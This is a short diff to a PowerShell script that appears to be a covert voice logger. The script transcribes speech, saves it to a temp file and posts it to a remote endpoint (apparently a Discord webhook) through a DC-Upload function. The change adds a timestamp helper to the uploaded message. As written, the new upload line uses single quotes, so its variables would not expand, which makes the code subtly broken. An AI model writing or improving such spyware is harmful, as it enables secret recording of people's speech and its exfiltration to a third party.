@@ -16,7 +16,9 @@ function DC-Upload {
 	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};
 }
 
-
+function Get-TimeStamp {
+    return "[{0:MM/dd/yy} {0:HH:mm:ss}]" -f (Get-Date)   
+}
 
 function voiceLogger {
 
@@ -36,7 +38,7 @@ function voiceLogger {
             $log = "$env:tmp/VoiceLog.txt"
             echo $results > $log
             $text = get-content $log -raw
-            DC-Upload $text
+            DC-Upload '(-) $(Get-TimeStamp): $text'
 
             # Use a switch statement with the $results variable
             switch -regex ($results) {
